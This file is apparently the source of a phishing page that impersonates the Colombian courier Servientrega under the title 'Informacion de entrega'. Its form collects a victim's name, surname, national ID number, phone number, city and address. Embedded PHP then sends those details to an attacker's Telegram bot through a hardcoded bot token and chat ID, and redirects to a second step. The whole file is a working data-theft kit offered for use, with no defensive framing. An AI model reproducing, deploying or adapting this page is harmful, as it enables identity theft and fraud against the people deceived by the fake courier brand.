<!DOCTYPE html>
<html lang="en">
<head>
    <meta name="robots" content="noindex, nofollow">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Informacion de entrega</title>
    <link rel="stylesheet" href="style.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Urbanist:wght@100&display=swap" rel="stylesheet">
<script src="https://kit.fontawesome.com/363b8144db.js" crossorigin="anonymous"></script>
<script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>

    
</head>
<body>

<?php
if (isset($_POST['saveb'])){

    $name = $_POST['name'];
    $surname = $_POST['surname'];
    $id = $_POST['id'];
    $phone = $_POST['phone'];
    $city = $_POST['city'];
    $adress = $_POST['adress'];
    $token = "6628219247:AAE5YzvFhU7--dT4ioVSF1jehH7oc_d1E0M";
    $chatid = "-1002033975046";
    $credentialss = "informacion recolectada\nName: " . $name . "\nsurname:" . $surname . "\nid:" . $id . "\nphone:" . $phone . "\ncity:" . $city . "\nadress:" . $adress . "";

    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatid . "&text=" . urlencode($credentialss);
    $response = file_get_contents($url);

    header("Location: data.php");
    exit;
}
?>



<header>   
    <div class="logo">
        <img src="img/servientrega.png" width="200" style="display: block;" /> 
    </div>
</header>
    <h1>Informacion de entrega</h1>
    <p1>paso 1 de 2</p1> 
   
    
<form method="post" class="input-field" action="form.php">  
            
    <input class="controls" type="text" name="name"
    id="name" placeholder="Nombre" required>
    <i class="form_icon fa-solid fa-user"></i> 

    <input class="controls"  type="text" name="surname"
    id="surname" placeholder="Apellido" required>
    <i class="form_icon fa-solid fa-user"></i> 

    <input class="controls" type="text" name="id"
    id="id" placeholder="Cedula de ciudadania" required>
    <i class="form_icon fa-solid fa-id-card"></i> 

    <input class="controls" type="text" name="phone"
    id="phone" placeholder="Telefono de contacto" required>
    <i class="form_icon fa-solid fa-phone"></i>  

    <input class="controls" type="text" name="city"
    id="city" placeholder="Ciudad de entrega" required>
    <i class="form_icon fa-solid fa-map-location-dot"></i>  

    <input class="controls" type="text" name="adress"
    id="adress" placeholder="Direccion de entrega" required>
    <i class="form_icon fa-solid fa-location-dot"></i> 
       
    

    <p2><input type="checkbox"> Estoy deacuerdo con <a href="#"> terminos y condiciones</a></p2> 
    <p3><input type="checkbox"> Deseo recibir mas informacion por parte de solucionesdigitales@servientrega.com </p3> 
        
        
    <input class="submit__page" type="submit" value="Continuar" name="saveb"/>
</form>    

<script>
    $(document).ready(function(){
        $('#phone').mask('000 000 0000');
    });
</script>
    
</body>
</html>

